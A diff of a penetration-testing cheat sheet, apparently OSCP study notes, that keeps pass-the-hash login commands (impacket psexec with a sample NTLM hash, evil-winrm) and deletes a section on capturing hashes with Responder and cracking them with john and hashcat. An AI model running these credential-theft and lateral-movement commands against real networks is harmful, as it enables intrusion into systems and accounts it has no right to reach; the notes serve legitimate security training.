@@ -15,19 +15,7 @@ Use secretsdump.py to dump hashes and hash history from Active Directory databas
 Pass the Hash: use psexec or evil-winrm to login with username/ hash (doesn't need to be cracked)    
 
     python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "./Administrator"@192.168.204.183    
-    evi-winrm -i 127.0.0.1 -u username -H [NTLM hash]  
-### Responder 
-Responder is not allowed on the OSCP exam. Allows you to spoof various services then capture hashes from devices that try to authenticate to those.    
-Start responder:    
-
-     sudo responder.py -I eth0   #start on specified interface. Hashes will be captured when a device tries to authenticate to resources on the network.           
-     
-Captured hashes will be stored in the logs folder, in a .txt file named for the protcol-hash type- and IP captured from.     
-Crack Hashes from responder:     
-
-    john hashes.txt   #John the Ripper willa utomatically detect the format of hashes collected by Responder.    
-    hashcat -m 5500   #NTLMv1 (hashes captured from using a tool like Responder)     
-    hashcat -m 5600   #NTLMv2 (hashes captured from using a tool like Responder)  
+    evi-winrm -i 127.0.0.1 -u username -H [NTLM hash]   
 
 ## Kerberos (Port 88)   
 Tools: [Kerbrute](https://github.com/ropnop/kerbrute), [Rubeus](https://github.com/GhostPack/Rubeus)   
